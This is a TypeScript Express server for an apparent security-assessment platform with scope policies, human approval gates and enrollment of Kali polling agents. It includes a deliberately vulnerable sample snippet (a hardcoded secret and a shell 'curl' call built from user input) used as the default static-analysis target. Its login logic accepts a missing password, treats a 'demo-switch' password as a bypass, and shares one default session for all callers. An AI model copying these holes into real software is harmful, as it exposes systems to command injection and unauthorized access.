import crypto from 'node:crypto';
import path from 'node:path';
import express from 'express';
import { createServer as createViteServer } from 'vite';
import {
  validateHttpsBackendUrl,
  issueEnrollmentCode,
  enrollAgentWithCode,
  recordAgentHeartbeat,
  rotateAgentCredential,
  revokeAgentCredential,
  submitScanJob,
  approveScanJob,
  createInitialStoreState,
  isTargetInAllowedScope,
  sha256Hex,
} from './src/lib/sentinelEngine';
import {
  AllowedMvpCategory,
  GatedCategory,
  AuthorizedAsset,
  ScopePolicy,
  SecurityJob,
  evaluateJobPolicy,
  runPassiveHttpHeaderCheck,
  runSafeStaticCodeAnalysis,
  claimJobIdempotently,
  issueDeviceEnrollmentCode,
  enrollDeviceWithSingleUseCode,
  processAuthenticatedAgentHeartbeat,
  controlAgentDeviceState,
  rotateDeviceTokenRecord,
} from './src/lib/policyEngine';
import { generateStructuredAssessmentPlan } from './src/server/geminiPlanner';
import {
  loadPlatformState,
  savePlatformState,
  appendAuditLog,
  toSanitizedBootstrapPayload,
  getPollingAgentVaultToken,
  savePollingAgentVaultToken,
  createSeedPlatformState,
} from './src/server/sentinelPlatformStore';
import { buildSetupPackageTarGz, buildSetupPackageFiles } from './src/lib/setupPackageBuilder';
import {
  loadStoreState,
  saveStoreState,
  saveServerVaultToken,
  getServerVaultToken,
  toPublicStatusPayload,
} from './src/server/persistentStore';

async function startServer() {
  const app = express();
  const PORT = Number(process.env.PORT) || 3000;
  const defaultAppUrl = (process.env.APP_URL || 'https://sentinel-ai.internal').replace(/\/+$/, '');

  app.use(express.json({ limit: '512kb' }));

  // Hardened HTTP security headers on every response
  app.use((_req, res, next) => {
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('X-Frame-Options', 'SAMEORIGIN');
    res.setHeader('Referrer-Policy', 'no-referrer');
    res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
    res.setHeader('Cache-Control', 'no-store');
    next();
  });

  function resolveOperatorFromRequest(req: express.Request) {
    const pState = loadPlatformState();
    const sessionToken = String(req.headers['x-sentinel-session'] || 'default-operator-session');
    const session = pState.activeSessions[sessionToken];
    return { pState, sessionToken, operator: session?.operator || null };
  }

  // ============================================================================
  // SENTINEL AI PLATFORM API (/api/v1/*)
  // ============================================================================

  // 1. Bootstrap full platform state
  app.get('/api/v1/bootstrap', (req, res) => {
    const { pState, sessionToken } = resolveOperatorFromRequest(req);
    res.json(toSanitizedBootstrapPayload(pState, sessionToken));
  });

  // 2. Operator Login / Role Switch
  app.post('/api/v1/auth/login', (req, res) => {
    const pState = loadPlatformState();
    const { email, password } = req.body || {};
    const cleanEmail = String(email || '').trim().toLowerCase();

    const matchedOp = pState.operators.find((o) => o.email.toLowerCase() === cleanEmail);
    if (!matchedOp) {
      appendAuditLog(pState, {
        actor: cleanEmail || 'anonymous',
        action: 'AUTH_LOGIN_FAILED',
        resourceType: 'auth',
        resourceId: 'session',
        decision: 'denied',
        summary: `Rejected operator login for unrecognized email "${cleanEmail}".`,
        metadata: { email: cleanEmail },
      });
      savePlatformState(pState);
      res.status(200).json({
        ok: false,
        httpStatus: 401,
        code: 'INVALID_CREDENTIALS',
        message: 'Unrecognized operator email or invalid credentials.',
        bootstrap: toSanitizedBootstrapPayload(pState),
      });
      return;
    }

    // Verify password if supplied and non-demo
    if (password && String(password) !== 'demo-switch' && sha256Hex(String(password)) !== matchedOp.passwordHash) {
      appendAuditLog(pState, {
        actor: matchedOp.email,
        action: 'AUTH_LOGIN_FAILED',
        resourceType: 'auth',
        resourceId: matchedOp.id,
        decision: 'denied',
        summary: `Rejected operator login for ${matchedOp.displayName}: invalid password.`,
        metadata: { operatorId: matchedOp.id },
      });
      savePlatformState(pState);
      res.status(200).json({
        ok: false,
        httpStatus: 401,
        code: 'INVALID_CREDENTIALS',
        message: 'Invalid operator password.',
        bootstrap: toSanitizedBootstrapPayload(pState),
      });
      return;
    }

    const { passwordHash: _unused, ...operatorPublic } = matchedOp;
    pState.activeSessions['default-operator-session'] = {
      operator: operatorPublic,
      issuedAt: new Date().toISOString(),
    };

    appendAuditLog(pState, {
      actor: `${operatorPublic.displayName} (${operatorPublic.role})`,
      action: 'AUTH_SESSION_ESTABLISHED',
      resourceType: 'auth',
      resourceId: operatorPublic.id,
      decision: 'allowed',
      summary: `Authenticated operator session for ${operatorPublic.displayName} (${operatorPublic.role}).`,
      metadata: { role: operatorPublic.role },
    });

    savePlatformState(pState);
    res.json({
      ok: true,
      httpStatus: 200,
      code: 'AUTHENTICATED',
      message: `Signed in as ${operatorPublic.displayName} (${operatorPublic.role}).`,
      bootstrap: toSanitizedBootstrapPayload(pState),
    });
  });

  // 3. Register Authorized Asset
  app.post('/api/v1/assets', (req, res) => {
    const { pState, operator } = resolveOperatorFromRequest(req);
    if (!operator) {
      res.status(200).json({ ok: false, httpStatus: 401, code: 'UNAUTHORIZED', message: 'Authentication required.' });
      return;
    }

    const { name, targetHost, ipOrCidr, environment, ownerTeam, authorizationRef, expiresAt, verified } = req.body || {};
    if (!name || !targetHost || !ipOrCidr || !authorizationRef) {
      res.status(200).json({
        ok: false,
        httpStatus: 400,
        code: 'VALIDATION_ERROR',
        message: 'Asset name, targetHost, ipOrCidr, and authorizationRef are required.',
      });
      return;
    }

    const newAsset: AuthorizedAsset = {
      id: `ast-${crypto.randomBytes(3).toString('hex')}`,
      name: String(name).trim(),
      targetHost: String(targetHost).trim().toLowerCase(),
      ipOrCidr: String(ipOrCidr).trim(),
      environment:
        environment === 'isolated_lab' || environment === 'production_read_only' ? environment : 'staging',
      ownerTeam: String(ownerTeam || 'Security Research').trim(),
      authorizationRef: String(authorizationRef).trim().toUpperCase(),
      verified: Boolean(verified),
      verifiedBy: verified ? operator.displayName : null,
      expiresAt: expiresAt || new Date(Date.now() + 90 * 86400_000).toISOString(),
      createdAt: new Date().toISOString(),
    };

    pState.assets.unshift(newAsset);
    appendAuditLog(pState, {
      actor: `${operator.displayName} (${operator.role})`,
      action: 'ASSET_REGISTERED',
      resourceType: 'asset',
      resourceId: newAsset.id,
      decision: 'allowed',
      summary: `Registered asset "${newAsset.name}" (${newAsset.targetHost}) with authorization ${newAsset.authorizationRef}.`,
      metadata: { authorizationRef: newAsset.authorizationRef, verified: newAsset.verified },
    });

    savePlatformState(pState);
    res.json({
      ok: true,
      message: `Asset "${newAsset.name}" registered.`,
      asset: newAsset,
      bootstrap: toSanitizedBootstrapPayload(pState),
    });
  });

  // 4. Verify Authorized Asset Record
  app.post('/api/v1/assets/:assetId/verify', (req, res) => {
    const { pState, operator } = resolveOperatorFromRequest(req);
    if (!operator || operator.role === 'auditor') {
      res.status(200).json({
        ok: false,
        httpStatus: 403,
        code: 'FORBIDDEN_ROLE',
        message: 'Only lead_researcher or security_reviewer roles may verify asset authorizations.',
      });
      return;
    }

    const asset = pState.assets.find((a) => a.id === req.params.assetId);
    if (!asset) {
      res.status(200).json({ ok: false, httpStatus: 404, code: 'ASSET_NOT_FOUND', message: 'Asset not found.' });
      return;
    }

    asset.verified = true;
    asset.verifiedBy = operator.displayName;

    appendAuditLog(pState, {
      actor: `${operator.displayName} (${operator.role})`,
      action: 'ASSET_AUTHORIZATION_VERIFIED',
      resourceType: 'asset',
      resourceId: asset.id,
      decision: 'allowed',
      summary: `Verified authorization ${asset.authorizationRef} for asset "${asset.name}" (${asset.targetHost}).`,
      metadata: { authorizationRef: asset.authorizationRef },
    });

    savePlatformState(pState);
    res.json({
      ok: true,
      message: `Authorization ${asset.authorizationRef} verified by ${operator.displayName}.`,
      bootstrap: toSanitizedBootstrapPayload(pState),
    });
  });

  // 5. Create Scope Policy
  app.post('/api/v1/policies', (req, res) => {
    const { pState, operator } = resolveOperatorFromRequest(req);
    if (!operator) {
      res.status(200).json({ ok: false, httpStatus: 401, code: 'UNAUTHORIZED', message: 'Authentication required.' });
      return;
    }

    const {
      name,
      authorizationRef,
      permittedHosts,
      permittedCidrs,
      allowedCategories,
      maxRateLimitRpm,
      expiresAt,
    } = req.body || {};

    if (!name || !authorizationRef) {
      res.status(200).json({
        ok: false,
        httpStatus: 400,
        code: 'VALIDATION_ERROR',
        message: 'Policy name and authorizationRef are required.',
      });
      return;
    }

    const safeCategories: Array<AllowedMvpCategory | GatedCategory> = Array.isArray(allowedCategories)
      ? allowedCategories.filter((c): c is AllowedMvpCategory | GatedCategory =>
          ['passive_http_headers', 'static_code_analysis', 'intrusive_review_only'].includes(String(c))
        )
      : ['passive_http_headers', 'static_code_analysis'];

    const newPolicy: ScopePolicy = {
      id: `pol-${crypto.randomBytes(3).toString('hex')}`,
      name: String(name).trim(),
      authorizationRef: String(authorizationRef).trim().toUpperCase(),
      permittedHosts: Array.isArray(permittedHosts)
        ? permittedHosts.map((h) => String(h).trim()).filter(Boolean)
        : [String(permittedHosts || '').trim()].filter(Boolean),
      permittedCidrs: Array.isArray(permittedCidrs)
        ? permittedCidrs.map((c) => String(c).trim()).filter(Boolean)
        : [String(permittedCidrs || '10.24.0.0/24').trim()].filter(Boolean),
      allowedCategories: safeCategories.length > 0 ? safeCategories : ['passive_http_headers', 'static_code_analysis'],
      maxRateLimitRpm: Math.min(Math.max(Number(maxRateLimitRpm) || 30, 1), 120),
      requireHumanApprovalForIntrusive: true,
      expiresAt: expiresAt || new Date(Date.now() + 90 * 86400_000).toISOString(),
      active: true,
      createdAt: new Date().toISOString(),
    };

    pState.policies.unshift(newPolicy);
    appendAuditLog(pState, {
      actor: `${operator.displayName} (${operator.role})`,
      action: 'SCOPE_POLICY_CREATED',
      resourceType: 'policy',
      resourceId: newPolicy.id,
      decision: 'allowed',
      summary: `Created scope policy "${newPolicy.name}" (${newPolicy.authorizationRef}, max ${newPolicy.maxRateLimitRpm} req/min).`,
      metadata: { authorizationRef: newPolicy.authorizationRef, maxRateLimitRpm: newPolicy.maxRateLimitRpm },
    });

    savePlatformState(pState);
    res.json({
      ok: true,
      message: `Scope policy "${newPolicy.name}" created.`,
      policy: newPolicy,
      bootstrap: toSanitizedBootstrapPayload(pState),
    });
  });

  // 6. Dry-Run Policy Engine Evaluation Endpoint
  app.post('/api/v1/policies/evaluate', (req, res) => {
    const { pState, operator } = resolveOperatorFromRequest(req);
    const { assetId, policyId, targetHost, category, requestedRateLimitRpm, rawCommandInput } = req.body || {};

    const asset = pState.assets.find((a) => a.id === assetId);
    const policy = pState.policies.find((p) => p.id === policyId);

    const evaluation = evaluateJobPolicy({
      asset,
      policy,
      targetHost: String(targetHost || ''),
      category: String(category || ''),
      requestedRateLimitRpm: Number(requestedRateLimitRpm ?? 15),
      rawCommandInput: typeof rawCommandInput === 'string' && rawCommandInput.trim() ? rawCommandInput : undefined,
    });

    appendAuditLog(pState, {
      actor: operator ? `${operator.displayName} (${operator.role})` : 'policy-evaluator',
      action: `POLICY_EVALUATION_${evaluation.code}`,
      resourceType: 'policy',
      resourceId: policy?.id || 'none',
      decision: !evaluation.allowed ? 'denied' : evaluation.requiresHumanApproval ? 'approval_required' : 'allowed',
      summary: `Policy evaluation on "${targetHost}" (${category}): ${evaluation.code} — ${evaluation.reason}`,
      metadata: {
        targetHost: String(targetHost || ''),
        category: String(category || ''),
        code: evaluation.code,
      },
    });

    savePlatformState(pState);
    res.json({
      ok: evaluation.allowed,
      evaluation,
      bootstrap: toSanitizedBootstrapPayload(pState),
    });
  });

  // 7. Server-Side Gemini AI Structured Assessment Planner
  app.post('/api/v1/plans/generate', async (req, res) => {
    const { pState, operator } = resolveOperatorFromRequest(req);
    if (!operator) {
      res.status(200).json({ ok: false, httpStatus: 401, code: 'UNAUTHORIZED', message: 'Authentication required.' });
      return;
    }

    const { assetId, policyId, objective } = req.body || {};
    const asset = pState.assets.find((a) => a.id === assetId);
    const policy = pState.policies.find((p) => p.id === policyId);

    if (!asset || !policy) {
      res.status(200).json({
        ok: false,
        httpStatus: 400,
        code: 'ASSET_OR_POLICY_MISSING',
        message: 'Select a valid Authorized Asset and Scope Policy before generating an assessment plan.',
      });
      return;
    }

    if (!asset.verified) {
      appendAuditLog(pState, {
        actor: `${operator.displayName} (${operator.role})`,
        action: 'PLAN_GENERATION_DENIED_UNVERIFIED_ASSET',
        resourceType: 'plan',
        resourceId: asset.id,
        decision: 'denied',
        summary: `Blocked AI plan generation for unverified asset "${asset.name}".`,
        metadata: { assetId: asset.id },
      });
      savePlatformState(pState);
      res.status(200).json({
        ok: false,
        httpStatus: 403,
        code: 'ASSET_UNVERIFIED',
        message: `Asset "${asset.name}" must be verified before generating an assessment plan.`,
        bootstrap: toSanitizedBootstrapPayload(pState),
      });
      return;
    }

    const cleanObjective =
      String(objective || '').trim() ||
      `Evaluate passive HTTP security headers and perform static code analysis for ${asset.name}.`;

    const { plan, geminiTestedLive, notice } = await generateStructuredAssessmentPlan({
      objective: cleanObjective,
      asset,
      policy,
      createdBy: operator.displayName,
    });

    if (geminiTestedLive) {
      pState.integrationStatus.geminiTestedLive = true;
      pState.integrationStatus.lastTestedAt = new Date().toISOString();
    }

    pState.plans.unshift(plan);
    appendAuditLog(pState, {
      actor: `${operator.displayName} (${operator.role})`,
      action: 'STRUCTURED_AI_PLAN_GENERATED',
      resourceType: 'plan',
      resourceId: plan.id,
      decision: 'allowed',
      summary: `Generated structured assessment plan "${plan.title}" (${plan.steps.length} validated steps, source: ${plan.generatedBySource}).`,
      metadata: {
        planId: plan.id,
        source: plan.generatedBySource,
        stepsCount: plan.steps.length,
      },
    });

    savePlatformState(pState);
    res.json({
      ok: true,
      plan,
      geminiTestedLive,
      notice,
      bootstrap: toSanitizedBootstrapPayload(pState),
    });
  });

  // 8. Submit & Policy-Check Security Job (Passive HTTP Headers, Static Code Analysis, or Gated Review)
  app.post('/api/v1/jobs', (req, res) => {
    const { pState, operator } = resolveOperatorFromRequest(req);
    if (!operator) {
      res.status(200).json({ ok: false, httpStatus: 401, code: 'UNAUTHORIZED', message: 'Authentication required.' });
      return;
    }

    const {
      assetId,
      policyId,
      category,
      targetHost,
      rateLimitRpm,
      codeSnippet,
      codeFilename,
      executeImmediatelyInMvp,
      rawCommandInput,
    } = req.body || {};

    const asset = pState.assets.find((a) => a.id === assetId);
    const policy = pState.policies.find((p) => p.id === policyId);
    const resolvedTargetHost = String(targetHost || asset?.targetHost || '').trim();
    const resolvedRateLimit = Number(rateLimitRpm ?? 15);

    const evaluation = evaluateJobPolicy({
      asset,
      policy,
      targetHost: resolvedTargetHost,
      category: String(category || ''),
      requestedRateLimitRpm: resolvedRateLimit,
      rawCommandInput: typeof rawCommandInput === 'string' && rawCommandInput.trim() ? rawCommandInput : undefined,
    });

    if (!evaluation.allowed) {
      appendAuditLog(pState, {
        actor: `${operator.displayName} (${operator.role})`,
        action: `JOB_REJECTED_${evaluation.code}`,
        resourceType: 'job',
        resourceId: 'rejected',
        decision: 'denied',
        summary: `Policy Engine blocked job (${category} on ${resolvedTargetHost}): ${evaluation.reason}`,
        metadata: { code: evaluation.code, category: String(category || ''), targetHost: resolvedTargetHost },
      });
      savePlatformState(pState);
      res.status(200).json({
        ok: false,
        httpStatus: 403,
        code: evaluation.code,
        message: evaluation.reason,
        bootstrap: toSanitizedBootstrapPayload(pState),
      });
      return;
    }

    const now = new Date();
    const jobId = `job-${crypto.randomBytes(3).toString('hex')}`;
    const newJob: SecurityJob = {
      id: jobId,
      assetId: asset!.id,
      policyId: policy!.id,
      category: category as AllowedMvpCategory | GatedCategory,
      targetHost: resolvedTargetHost,
      codeSnippet: typeof codeSnippet === 'string' ? codeSnippet : undefined,
      codeFilename: typeof codeFilename === 'string' ? codeFilename : undefined,
      rateLimitRpm: resolvedRateLimit,
      status: evaluation.requiresHumanApproval ? 'pending_approval' : 'queued',
      requiresApproval: evaluation.requiresHumanApproval,
      approvedBy: null,
      approvedAt: null,
      claimedByAgentId: null,
      idempotencyClaimKey: null,
      claimedAt: null,
      expiresAt: new Date(now.getTime() + 2 * 3600_000).toISOString(),
      resultSummary: null,
      completedAt: null,
      createdBy: operator.displayName,
      createdAt: now.toISOString(),
    };

    // If executeImmediatelyInMvp is true and job does not require human approval, run the safe analyzer
    if (executeImmediatelyInMvp && !evaluation.requiresHumanApproval) {
      if (newJob.category === 'static_code_analysis') {
        const sast = runSafeStaticCodeAnalysis({
          jobId: newJob.id,
          assetId: newJob.assetId,
          targetHost: newJob.targetHost,
          codeSnippet:
            newJob.codeSnippet ||
            `const secret = "sk_live_demo_secret_998877";\nchild_process.exec("curl " + userUrl);`,
          filename: newJob.codeFilename || 'uploaded_snippet.ts',
          now,
        });
        pState.findings.unshift(...sast.findings);
        pState.remediations.unshift(...sast.remediations);
        newJob.status = 'completed';
        newJob.completedAt = now.toISOString();
        newJob.resultSummary = {
          checkedItems: sast.rulesChecked,
          findingsCount: sast.findings.length,
          summaryText: `Static code analysis inspected ${sast.rulesChecked} CWE sink patterns; ${sast.findings.length} findings recorded.`,
        };
      } else if (newJob.category === 'passive_http_headers') {
        const hdrCheck = runPassiveHttpHeaderCheck({
          jobId: newJob.id,
          assetId: newJob.assetId,
          targetHost: newJob.targetHost,
          now,
        });
        pState.findings.unshift(...hdrCheck.findings);
        pState.remediations.unshift(...hdrCheck.remediations);
        newJob.status = 'completed';
        newJob.completedAt = now.toISOString();
        newJob.resultSummary = {
          checkedItems: 6,
          findingsCount: hdrCheck.findings.length,
          summaryText: `Passive HTTP security-header check completed on ${newJob.targetHost}; ${hdrCheck.findings.length} header findings recorded.`,
          headersInspected: hdrCheck.headersInspected,
        };
      }
    }

    pState.jobs.unshift(newJob);

    appendAuditLog(pState, {
      actor: `${operator.displayName} (${operator.role})`,
      action: evaluation.requiresHumanApproval ? 'JOB_HELD_FOR_HUMAN_APPROVAL' : 'JOB_CREATED',
      resourceType: 'job',
      resourceId: newJob.id,
      decision: evaluation.requiresHumanApproval ? 'approval_required' : 'allowed',
      summary: `Created ${newJob.category} job (${newJob.id}) for ${newJob.targetHost} [status: ${newJob.status}].`,
      metadata: {
        jobId: newJob.id,
        category: newJob.category,
        status: newJob.status,
        rateLimitRpm: newJob.rateLimitRpm,
      },
    });

    savePlatformState(pState);
    res.json({
      ok: true,
      code: evaluation.code,
      message:
        newJob.status === 'pending_approval'
          ? `Job ${newJob.id} passed scope checks and is held pending human operator approval.`
          : newJob.status === 'completed'
          ? `Job ${newJob.id} validated and executed safely (${newJob.resultSummary?.findingsCount || 0} findings).`
          : `Job ${newJob.id} validated and queued for outbound Kali agent polling.`,
      job: newJob,
      bootstrap: toSanitizedBootstrapPayload(pState),
    });
  });

  // 9. Human Approval for Gated Job
  app.post('/api/v1/jobs/:jobId/approve', (req, res) => {
    const { pState, operator } = resolveOperatorFromRequest(req);
    if (!operator || operator.role === 'auditor') {
      res.status(200).json({
        ok: false,
        httpStatus: 403,
        code: 'FORBIDDEN_ROLE',
        message: 'Only lead_researcher or security_reviewer roles may approve gated jobs.',
      });
      return;
    }

    const job = pState.jobs.find((j) => j.id === req.params.jobId);
    if (!job) {
      res.status(200).json({ ok: false, httpStatus: 404, code: 'JOB_NOT_FOUND', message: 'Job not found.' });
      return;
    }

    job.status = 'queued';
    job.approvedBy = operator.displayName;
    job.approvedAt = new Date().toISOString();

    appendAuditLog(pState, {
      actor: `${operator.displayName} (${operator.role})`,
      action: 'JOB_APPROVED_BY_HUMAN',
      resourceType: 'job',
      resourceId: job.id,
      decision: 'allowed',
      summary: `Human operator ${operator.displayName} approved job ${job.id} (${job.category} on ${job.targetHost}); transitioned to queued.`,
      metadata: { jobId: job.id, targetHost: job.targetHost },
    });

    savePlatformState(pState);
    res.json({
      ok: true,
      message: `Job ${job.id} approved by ${operator.displayName} and released to the agent queue.`,
      job,
      bootstrap: toSanitizedBootstrapPayload(pState),
    });
  });

  // 10. Human Approval for Remediation Plan
  app.post('/api/v1/remediations/:remId/approve', (req, res) => {
    const { pState, operator } = resolveOperatorFromRequest(req);
    if (!operator || operator.role === 'auditor') {
      res.status(200).json({
        ok: false,
        httpStatus: 403,
        code: 'FORBIDDEN_ROLE',
        message: 'Only lead_researcher or security_reviewer roles may approve remediation plans.',
      });
      return;
    }

    const rem = pState.remediations.find((r) => r.id === req.params.remId);
    if (!rem) {
      res.status(200).json({
        ok: false,
        httpStatus: 404,
        code: 'REMEDIATION_NOT_FOUND',
        message: 'Remediation item not found.',
      });
      return;
    }

    const { approvalNote } = req.body || {};
    rem.approvalStatus = 'approved';
    rem.approvedBy = operator.displayName;
    rem.approvalNote = String(approvalNote || 'Approved for staged configuration rollout; no automatic live-system mutation.').trim();
    rem.approvedAt = new Date().toISOString();

    const linkedFinding = pState.findings.find((f) => f.id === rem.findingId);
    if (linkedFinding) {
      linkedFinding.status = 'resolved';
    }

    appendAuditLog(pState, {
      actor: `${operator.displayName} (${operator.role})`,
      action: 'REMEDIATION_APPROVED_BY_HUMAN',
      resourceType: 'remediation',
      resourceId: rem.id,
      decision: 'allowed',
      summary: `Approved remediation "${rem.title}" for ${rem.targetHost}.`,
      metadata: { remediationId: rem.id, findingId: rem.findingId },
    });

    savePlatformState(pState);
    res.json({
      ok: true,
      message: `Remediation "${rem.title}" approved by ${operator.displayName}.`,
      remediation: rem,
      bootstrap: toSanitizedBootstrapPayload(pState),
    });
  });

  // ============================================================================
  // OUTBOUND HTTPS POLLING AGENT PROTOCOL (/api/v1/agent/*)
  // ============================================================================

  function authenticatePollingAgent(pState: ReturnType<typeof loadPlatformState>, req: express.Request) {
    const authHeader = String(req.headers.authorization || '');
    let rawToken = authHeader.replace(/^Bearer\s+/i, '').trim();
    const { agentId, useServerVault, useServerStoredDemoToken } = req.body || {};

    if (!rawToken && (useServerVault || useServerStoredDemoToken)) {
      const targetId = String(agentId || pState.agents[0]?.id || 'agt-kali-01');
      rawToken = getPollingAgentVaultToken(targetId) || '';
    }

    if (!rawToken) return null;
    const hash = sha256Hex(rawToken);
    return pState.agents.find((a) => a.credentialHash === hash) || null;
  }

  // 10b. Issue Short-Lived Single-Use Device Enrollment Code
  app.post('/api/v1/enrollments/issue', (req, res) => {
    const { pState, operator } = resolveOperatorFromRequest(req);
    if (!operator || operator.role === 'auditor') {
      res.status(200).json({
        ok: false,
        httpStatus: 403,
        code: 'FORBIDDEN_ROLE',
        message: 'Only lead_researcher or security_reviewer roles may issue device enrollment codes.',
      });
      return;
    }

    const { targetHostname, linuxUser, ttlMinutes } = req.body || {};
    const issued = issueDeviceEnrollmentCode({
      targetHostname: String(targetHostname || 'kali-research-node'),
      linuxUser: String(linuxUser || 'kali'),
      issuedBy: operator.displayName,
      ttlMinutes: Number(ttlMinutes) || 10,
    });

    pState.enrollmentCodes.unshift(issued.record);
    appendAuditLog(pState, {
      actor: `${operator.displayName} (${operator.role})`,
      action: 'DEVICE_ENROLLMENT_CODE_ISSUED',
      resourceType: 'agent',
      resourceId: issued.record.id,
      decision: 'allowed',
      summary: `Issued single-use enrollment code (${issued.record.codePreview}) for ${issued.record.linuxUser}@${issued.record.targetHostname} (expires ${issued.record.expiresAt}).`,
      metadata: {
        enrollmentId: issued.record.id,
        targetHostname: issued.record.targetHostname,
        linuxUser: issued.record.linuxUser,
      },
    });

    savePlatformState(pState);
    res.json({
      ok: true,
      code: 'ENROLLMENT_CODE_ISSUED',
      message: `Issued short-lived single-use enrollment code for ${issued.record.linuxUser}@${issued.record.targetHostname}.`,
      plaintextCode: issued.plaintextCode,
      enrollment: issued.record,
      bootstrap: toSanitizedBootstrapPayload(pState),
    });
  });

  // 10c. Exchange Single-Use Enrollment Code for Scoped Device Credential
  app.post('/api/v1/agent/enroll', (req, res) => {
    const pState = loadPlatformState();
    const { enrollmentCode, hostname, linuxUser, uid, version, osInfo, systemdAutostartEnabled } = req.body || {};

    const result = enrollDeviceWithSingleUseCode({
      enrollmentCodes: pState.enrollmentCodes,
      agents: pState.agents,
      plaintextCode: String(enrollmentCode || ''),
      hostname: String(hostname || 'kali-research-node'),
      linuxUser: String(linuxUser || 'kali'),
      uid: Number(uid ?? 1000),
      version: String(version || '2.1.0'),
      osInfo: String(osInfo || 'Kali GNU/Linux Rolling 2026.1 (x86_64)'),
      systemdAutostartEnabled: systemdAutostartEnabled !== undefined ? Boolean(systemdAutostartEnabled) : true,
    });

    if (!result.ok || !result.agent || !result.deviceToken) {
      appendAuditLog(pState, {
        actor: `${linuxUser || 'unknown'}@${hostname || 'unknown'}`,
        action: `DEVICE_ENROLLMENT_REJECTED_${result.code}`,
        resourceType: 'agent',
        resourceId: 'enrollment',
        decision: 'denied',
        summary: result.message,
        metadata: { code: result.code, uid: Number(uid ?? -1) },
      });
      savePlatformState(pState);
      res.status(200).json({
        ok: false,
        httpStatus: 400,
        code: result.code,
        message: result.message,
        bootstrap: toSanitizedBootstrapPayload(pState),
      });
      return;
    }

    // Store raw token only in server-side vault (never exposed in bootstrap payload)
    savePollingAgentVaultToken(result.agent.id, result.deviceToken);

    appendAuditLog(pState, {
      actor: `${result.agent.linuxUser}@${result.agent.hostname}`,
      action: 'DEVICE_ENROLLED_PENDING_HEARTBEAT',
      resourceType: 'agent',
      resourceId: result.agent.id,
      decision: 'allowed',
      summary: result.message,
      metadata: {
        agentId: result.agent.id,
        uid: result.agent.uid,
        status: result.agent.status,
      },
    });

    savePlatformState(pState);
    res.json({
      ok: true,
      code: result.code,
      message: result.message,
      agentId: result.agent.id,
      credentialFingerprint: result.agent.credentialFingerprint,
      bootstrap: toSanitizedBootstrapPayload(pState),
    });
  });

  // 10d. Authenticated Agent Heartbeat (Required before displaying device as online)
  app.post('/api/v1/agent/heartbeat', (req, res) => {
    const pState = loadPlatformState();
    const agent = authenticatePollingAgent(pState, req);
    const { version, osInfo, jobStatus, systemdAutostartEnabled } = req.body || {};

    const hb = processAuthenticatedAgentHeartbeat({
      agent: agent || undefined,
      version: version ? String(version) : undefined,
      osInfo: osInfo ? String(osInfo) : undefined,
      jobStatus: jobStatus as 'idle' | 'claiming' | 'executing_allowlisted_task' | undefined,
      systemdAutostartEnabled: systemdAutostartEnabled !== undefined ? Boolean(systemdAutostartEnabled) : undefined,
    });

    if (hb.ok) {
      pState.integrationStatus.kaliAgentPolledLive = true;
      pState.integrationStatus.lastTestedAt = new Date().toISOString();
    }

    appendAuditLog(pState, {
      actor: agent ? `${agent.linuxUser}@${agent.hostname}` : 'unauthenticated-agent',
      action: `AGENT_${hb.code}`,
      resourceType: 'agent',
      resourceId: agent?.id || 'unknown',
      decision: hb.ok ? 'allowed' : 'denied',
      summary: hb.message,
      metadata: {
        agentId: agent?.id || 'unknown',
        status: agent?.status || 'unauthorized',
      },
    });

    savePlatformState(pState);
    res.status(200).json({
      ok: hb.ok,
      httpStatus: hb.ok ? 200 : 401,
      code: hb.code,
      agentStatus: agent?.status || 'unauthorized',
      message: hb.message,
      bootstrap: toSanitizedBootstrapPayload(pState),
    });
  });

  // 10e. Operator Device Control: Pause / Resume / Disconnect / Revoke / Uninstall
  app.post('/api/v1/agents/:agentId/control', (req, res) => {
    const { pState, operator } = resolveOperatorFromRequest(req);
    if (!operator || operator.role === 'auditor') {
      res.status(200).json({
        ok: false,
        httpStatus: 403,
        code: 'FORBIDDEN_ROLE',
        message: 'Only lead_researcher or security_reviewer roles may control or revoke agent devices.',
      });
      return;
    }

    const agent = pState.agents.find((a) => a.id === req.params.agentId);
    const rawAction = String(req.body?.action || '');
    if (!['pause', 'resume', 'disconnect', 'revoke', 'uninstall'].includes(rawAction)) {
      res.status(200).json({
        ok: false,
        httpStatus: 400,
        code: 'INVALID_ACTION',
        message: 'Supported actions: pause, resume, disconnect, revoke, uninstall.',
      });
      return;
    }

    const ctrl = controlAgentDeviceState({
      agent,
      jobs: pState.jobs,
      action: rawAction as 'pause' | 'resume' | 'disconnect' | 'revoke' | 'uninstall',
    });

    appendAuditLog(pState, {
      actor: `${operator.displayName} (${operator.role})`,
      action: `DEVICE_CONTROL_${ctrl.code}`,
      resourceType: 'agent',
      resourceId: req.params.agentId,
      decision: ctrl.ok ? 'allowed' : 'denied',
      summary: ctrl.message,
      metadata: { action: rawAction, newStatus: agent?.status || 'unknown' },
    });

    savePlatformState(pState);
    res.json({
      ok: ctrl.ok,
      code: ctrl.code,
      message: ctrl.message,
      bootstrap: toSanitizedBootstrapPayload(pState),
    });
  });

  // 10f. Rotate Token for Specific Device
  app.post('/api/v1/agents/:agentId/rotate-token', (req, res) => {
    const { pState, operator } = resolveOperatorFromRequest(req);
    if (!operator || operator.role === 'auditor') {
      res.status(200).json({
        ok: false,
        httpStatus: 403,
        code: 'FORBIDDEN_ROLE',
        message: 'Only lead_researcher or security_reviewer roles may rotate device tokens.',
      });
      return;
    }

    const agent = pState.agents.find((a) => a.id === req.params.agentId);
    const rotated = rotateDeviceTokenRecord({ agent });
    if (!rotated.ok || !rotated.agent || !rotated.newTokenPlaintext) {
      res.status(200).json({
        ok: false,
        code: rotated.code,
        message: rotated.message,
        bootstrap: toSanitizedBootstrapPayload(pState),
      });
      return;
    }

    savePollingAgentVaultToken(rotated.agent.id, rotated.newTokenPlaintext);
    appendAuditLog(pState, {
      actor: `${operator.displayName} (${operator.role})`,
      action: 'DEVICE_TOKEN_ROTATED',
      resourceType: 'agent',
      resourceId: rotated.agent.id,
      decision: 'allowed',
      summary: rotated.message,
      metadata: { agentId: rotated.agent.id, fingerprint: rotated.agent.credentialFingerprint },
    });

    savePlatformState(pState);
    res.json({
      ok: true,
      code: rotated.code,
      message: rotated.message,
      bootstrap: toSanitizedBootstrapPayload(pState),
    });
  });

  // 10g. Downloadable Linux Installer & Python Agent Package Endpoints
  app.get('/api/v1/agent-package/manifest', (_req, res) => {
    const pkg = buildSetupPackageTarGz('2.1.0', defaultAppUrl);
    res.json({
      ok: true,
      manifest: pkg.manifest,
    });
  });

  app.get('/api/v1/agent-package/bundle.tar.gz', (_req, res) => {
